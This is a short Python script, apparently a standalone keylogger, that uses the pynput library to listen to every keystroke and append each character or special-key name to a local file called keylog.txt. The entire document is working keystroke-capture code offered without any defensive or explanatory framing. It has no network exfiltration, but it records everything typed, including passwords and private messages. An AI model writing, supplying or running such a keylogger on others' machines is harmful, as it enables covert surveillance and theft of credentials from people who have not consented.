from pynput import keyboard
FILE_NAME = 'keylog.txt'

def on_press(key):
    try:
        char = "{0}".format(key.char)
        with open(FILE_NAME, mode='a') as f:
          f.write(''.join(char+"\n"))
    except AttributeError:
        cmdkey="{0}".format(key)
        char = cmdkey[4:]
        with open(FILE_NAME, mode='a') as f:
          f.write(''.join(char+"\n"))

def on_release(key):
    pass

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
